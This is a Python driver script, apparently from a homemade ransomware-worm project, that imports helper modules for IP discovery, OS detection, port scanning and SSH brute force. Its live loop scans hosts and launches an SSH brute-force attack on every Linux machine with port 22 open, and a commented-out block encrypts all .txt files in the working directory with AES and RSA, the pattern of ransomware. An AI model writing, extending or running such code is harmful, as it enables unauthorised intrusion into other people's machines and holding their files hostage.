from os import listdir
from os.path import isfile, join
from os import getcwd
from aes_decryption import aes_decrypt
from aes_encryption import aes_encrypt
import RSA_encryption as Rencrypt
import RSA_decryption as Rdecrypt
import get_ip 
import get_os
import SSHBruteForce as ssh
import port_scan as port

ip_list = get_ip.get_ip_()
print(ip_list)
for ip in ip_list:
   os_name = get_os.get_os_(ip)
   port_22 = port.check_open_port(ip)
   print(port_22)
   print(os_name)
   if(os_name == 'Linux' and port_22 == True ):
          ssh.d_main(ip)


#driver = int(input("Enter 1 for encryption and 2 for decryption:"))
#if(driver == 1):
#   onlyfiles = [f for f in listdir(getcwd()) if(isfile(join(getcwd(), f))  and f.split('.')[1]=="txt" )]
#   for file in onlyfiles:
#      aes_encrypt(file)
#   Rencrypt.d_main()
#elif(driver == 2):
#   Rdecrypt.d_main()
#   onlyfiles = [f for f in listdir(getcwd()) if(isfile(join(getcwd(), f))  and f.split('.')[1]=="txt" )]
#  for file in onlyfiles:
#       aes_decrypt(file)
   
